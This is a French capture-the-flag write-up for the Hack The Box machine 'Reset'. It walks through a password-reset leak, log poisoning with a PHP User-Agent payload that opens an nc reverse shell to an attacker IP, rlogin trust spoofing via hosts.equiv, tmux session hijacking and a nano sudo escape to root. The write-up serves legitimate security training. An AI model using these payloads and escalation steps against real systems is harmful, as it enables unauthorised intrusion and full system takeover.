---
title: Reset
description: reset me this!
tags:
  - HTB
  - machine
date: 2026-03-30T16:52
tasks:
  - format
parent file:
  - 
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "8"
seasonal: no
---

# Foothold

On commence par un scan
```
nmap -sCV reset.htb -oN nmap.out
```
et on trouve étrangement beaucoup de ports ouverts.
```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-30 16:51 CEST
Nmap scan report for reset.htb (10.129.234.130)
Host is up (0.023s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6a161fc8fefde398a685cffe7b0e60aa (ECDSA)
|_  256 e408cc5f8e56258f38c3ecdfb8860c69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Admin Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On commence par se connecter au port `512` et on trouve un script qui nous pose une question, `513` ne nous donne rien et `514` non plus.

Sur la page web on trouve seulement une page de connexion.
![[Pasted image 20260330165854.png]]

De tous les scans ffuf, seul un nous retourne une page intéressante:
![[Pasted image 20260330171058.png]]

On tente de réinitialiser un mot de passe et on trouve, en inspectant la réponse, que l'on nous donne le mot de passe (on la trouve en inspectant avec burp).
![[Pasted image 20260330174729.png]]

On voit que l'on peut afficher le contenu de fichiers logs sur la page principale. On continue avec burp et on voit qu'on peut modifier le fichier que le script va chercher. 

On peut tester les fichiers et trouver un fichier que l'on peut lire: `/var/log/apache2/access.log` et on voit dedans le nom du user-agent qui est affiché.
![[Pasted image 20260331164210.png]]

On utilise donc cela pour effectuer log poisonning:
```
User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444>/tmp/f'); ?>
```

Et voilà, notre reverse shell
![[Pasted image 20260331164438.png]]

# Privilege Escalation to user

On se balade dans les dossiers et on trouve un dossier `private_*`, en regardant dedans on trouve une db, on la lit et on trouve un mot de passe. En regardant dans le fichier `reset_password.php` on lit que la db sert en fait à se connecter au site web, le mot de passe dedans est donc celui de notre ancien utilisateur.

On regarde un peu plus et on trouve dans le dossier de sadm le fichier `user.txt`, on a notre premier flag, sans même avoir d'accès utilisateur. On verra en creusant qu'on passe tout de même par un utilisateur pour y arriver.



On retrouve nos process qui tournent sur les ports ouverts.
```
shell		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rshd
login		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rlogind
exec		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rexecd
```

On voit que cela vient de r-services, qui permettent une connexion à distance. On peut lire notamment dans les fichiers de configuration
```
cat /etc/hosts.equiv
```
la configuration pour la connexion
```
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#		    command access to your system .
- root
- local
+ sadm
```
qui nous dit que sadm peut se connecter en tant que n'importe quel utilisateur sauf `root` et `local`. On tente de leur faire croire que la connexion vient de sadm et... Ca marche!

```
rlogin reset.htb -l sadm -i sadm
```

![[Pasted image 20260331222101.png]]

(il faut noter que l'on aurait pu créer un utilisateur `sadm` et se connecter de la sorte à l'utilisateur `sadm` des r-services, sans l'aide de `-i`)

# PrivEsc to root

On voit dans les process qui tournent `tmux`, marqué par linpeas comme une vulnérabilité.

On arrive à lister les sessions avec
```
tmux ls
```
qui nous donne la session `sadm_session`, à laquelle on se connecte
```
tmux attach -t sadm_session
```

On s'y connecte et on peut maintenant utiliser `sudo -l`
![[Pasted image 20260401100744.png]]

On voit que l'on a le droit de lancer nano en sudo, sur le fichier `/etc/firewall.sh`.

On se renseigne sur gtfobins et voilà, on a notre rootshell!
```
sudo /etc/bin/nano /etc/firewall.sh
```
puis
```
^R^X
reset; sh 1>&0 2>&0
```

Et voilà, notre root flag
![[Pasted image 20260401101111.png]]

![[Pasted image 20260401101256.png]]